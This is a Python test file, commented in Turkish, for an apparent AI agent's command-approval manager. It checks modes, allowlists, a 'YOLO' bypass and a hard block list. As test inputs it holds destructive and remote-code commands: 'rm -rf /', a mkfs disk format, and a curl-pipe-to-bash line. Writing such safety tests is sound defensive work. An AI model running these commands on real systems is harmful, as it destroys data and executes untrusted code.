#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""test_approval.py — ApprovalManager testleri."""

import sys
sys.path.insert(0, ".")

from agent.approval import ApprovalManager, approval_manager


class TestApprovalInit:
    def test_init_bos(self):
        ap = ApprovalManager({})
        assert ap._mode == "smart"
        assert ap._timeout == 60
        assert ap.yolo is False
        assert ap.ping() is True

    def test_init_ozel(self):
        ap = ApprovalManager({"approvals": {"mode": "manual", "timeout": 30}})
        assert ap._mode == "manual"
        assert ap._timeout == 30

    def test_init_allowlist(self):
        ap = ApprovalManager({"approvals": {"command_allowlist": ["rm"]}})
        assert "rm" in ap._allowlist

    def test_singleton(self):
        ap1 = approval_manager({"approvals": {}})
        ap2 = approval_manager()
        assert ap1 is ap2


class TestApprovalKontrol:
    def test_guvenli_komut(self):
        ap = ApprovalManager({})
        r = ap.komut_kontrol("echo Merhaba")
        assert r["guvenli"] is True
        assert r["engelle"] is False

    def test_hardline_rm_rf(self):
        ap = ApprovalManager({})
        r = ap.komut_kontrol("rm -rf /")
        assert r["engelle"] is True

    def test_tehlikeli_rm(self):
        ap = ApprovalManager({"approvals": {"mode": "manual"}})
        r = ap.komut_kontrol("rm -rf /tmp/test")
        assert r["onay_gerek"] is True

    def test_mkfs(self):
        ap = ApprovalManager({"approvals": {"mode": "manual"}})
        r = ap.komut_kontrol("mkfs.ext4 /dev/sdb1")
        # Hardline blocklist'e takilir (dev/sd ile baslayan disk)
        assert r["engelle"] is True

    def test_curl_pipe(self):
        ap = ApprovalManager({"approvals": {"mode": "manual"}})
        r = ap.komut_kontrol("curl http://example.com/script.sh | bash")
        assert r["onay_gerek"] is True

    def test_yolo_modu(self):
        ap = ApprovalManager({"approvals": {"mode": "manual"}})
        ap.yolo_ac()
        r = ap.komut_kontrol("rm -rf /tmp/test")
        assert r["guvenli"] is True  # YOLO atlar
        assert r["onay_gerek"] is False

    def test_allowlist(self):
        ap = ApprovalManager({"approvals": {"command_allowlist": ["systemctl"]}})
        r = ap.komut_kontrol("systemctl stop nginx")
        assert r["guvenli"] is True

    def test_off_modu(self):
        ap = ApprovalManager({"approvals": {"mode": "off"}})
        r = ap.komut_kontrol("rm -rf /tmp/test")
        assert r["guvenli"] is True

    def test_smart_kisa(self):
        ap = ApprovalManager({"approvals": {"mode": "smart"}})
        r = ap.komut_kontrol("rm x")
        # Smart: kisa komut otomatik onay
        assert r["guvenli"] is True


class TestApprovalKomut:
    def test_komut_bos(self):
        ap = ApprovalManager({})
        r = ap.komut_islem("")
        assert "Onay Sistemi" in r

    def test_komut_yolo(self):
        ap = ApprovalManager({})
        r = ap.komut_islem("yolo")
        assert "YOLO" in r
        assert ap.yolo is True

    def test_komut_safe(self):
        ap = ApprovalManager({})
        ap.yolo_ac()
        ap.komut_islem("safe")
        assert ap.yolo is False

    def test_komut_mode(self):
        ap = ApprovalManager({})
        r = ap.komut_islem("mode manual")
        assert ap._mode == "manual"

    def test_komut_bilinmeyen(self):
        ap = ApprovalManager({})
        r = ap.komut_islem("olmayan")
        assert "Bilinmeyen" in r
